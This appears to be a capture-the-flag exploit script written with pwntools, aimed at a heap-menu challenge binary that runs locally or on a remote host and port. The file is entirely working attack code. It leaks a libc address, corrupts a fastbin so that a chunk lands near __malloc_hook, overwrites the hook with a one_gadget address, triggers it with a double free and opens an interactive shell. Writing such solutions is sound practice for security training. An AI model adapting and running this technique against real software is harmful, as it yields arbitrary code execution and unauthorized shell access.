#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '159.65.125.233'
port = 6003

binary = "./m"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def add(size, message):
  r.recvuntil("choice : ")
  r.sendline("0")
  r.recvuntil(": ")
  r.sendline(str(size))
  r.recvuntil(": ")
  r.send(message)
  pass

def edit():
  pass

def delete(index):
  r.recvuntil("choice : ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(index))
  pass

def show(index,start,end):
  r.recvuntil("choice : ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(index))
  r.recvuntil(start)
  data = r.recvuntil(end)[:-len(end)]
  return data

def change(index):
  r.recvuntil("choice : ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(index))

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  add(0x80,"A"*0x7f)
  add(0x60,"A"*0x5f)
  add(0x60,p64(0x61) + p64(0x60202a))
  delete(0)
  add(0x80,"A")
  libc.address = u64(show("3","Message : ","\n   ").ljust(8,"\x00")) - 0x3c4b41
  print "libc =",hex(libc.address)
  
  add(0x60,p64(0x71) + p64(libc.address + 0x3c4b10 - 0x23))
  delete(4)
  delete(1)
  change(1)
  change(1)
  change(1)
  add(0x60,"A"*0x2f)
  add(0x60,"A"*0x2f)
  raw_input("@")
  add(0x60,"A"*0xb + p64(libc.address + 0xf02a4))
  delete(0)
  delete(0)
  r.interactive()

